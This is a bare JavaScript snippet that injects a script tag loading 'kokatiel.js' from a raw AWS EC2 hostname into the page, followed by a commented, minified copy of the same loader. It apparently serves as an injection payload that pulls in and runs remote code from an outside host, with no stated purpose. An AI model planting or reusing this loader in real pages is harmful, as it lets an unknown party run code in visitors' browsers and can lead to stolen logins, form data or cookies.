var script = document.createElement('script');
script.src = "https://ec2-18-222-30-60.us-east-2.compute.amazonaws.com:80/kokatiel.js";
var firstScript = document.getElementsByTagName('script')[0];
firstScript.parentNode.insertBefore(script,firstScript);

//var s=document.createElement("script");s.src="https://ec2-18-222-30-60.us-east-2.compute.amazonaws.com:80/kokatiel.js";var f=document.getElementsByTagName("script")[0];f.parentNode.insertBefore(s,f);